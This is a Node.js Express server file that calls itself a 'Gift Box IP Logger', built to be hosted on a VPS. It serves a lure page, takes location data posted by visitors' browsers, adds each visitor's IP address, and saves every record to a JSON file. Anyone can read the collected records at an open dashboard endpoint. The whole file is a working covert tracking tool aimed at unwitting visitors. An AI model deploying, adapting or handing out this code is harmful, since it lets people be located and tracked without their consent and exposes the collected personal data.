const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5000;
const LOG_FILE = path.join(__dirname, "visitors.json");

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});
app.use(express.json());
app.use(express.static(__dirname));

if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, "[]", "utf-8");
}

app.get("/api/myip", (req, res) => {
  const ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
  res.json({ ip });
});

app.post("/api/log", (req, res) => {
  const data = req.body;
  data.timestamp = new Date().toISOString();
  data.received_ip = req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.socket.remoteAddress || "unknown";
  const records = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
  records.push(data);
  fs.writeFileSync(LOG_FILE, JSON.stringify(records, null, 2), "utf-8");
  console.log(`[+] ${data.ip || data.received_ip} - ${data.city || "?"}, ${data.country_name || "?"}`);
  res.json({ ok: true });
});

app.get("/dashboard", (req, res) => {
  const records = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
  res.json(records);
});

app.get("/api/visitors", (req, res) => {
  const records = JSON.parse(fs.readFileSync(LOG_FILE, "utf-8"));
  res.json(records);
});

app.listen(PORT, "0.0.0.0", () => {
  console.log("=".repeat(60));
  console.log("  GIFT BOX IP LOGGER (NODE)");
  console.log("=".repeat(60));
  console.log(`  Visit:   http://YOUR_VPS_IP:${PORT}/`);
  console.log(`  Data:    http://YOUR_VPS_IP:${PORT}/dashboard`);
  console.log(`  JSON:    http://YOUR_VPS_IP:${PORT}/api/visitors`);
  console.log(`  Your IP: http://YOUR_VPS_IP:${PORT}/api/myip`);
  console.log("=".repeat(60));
});
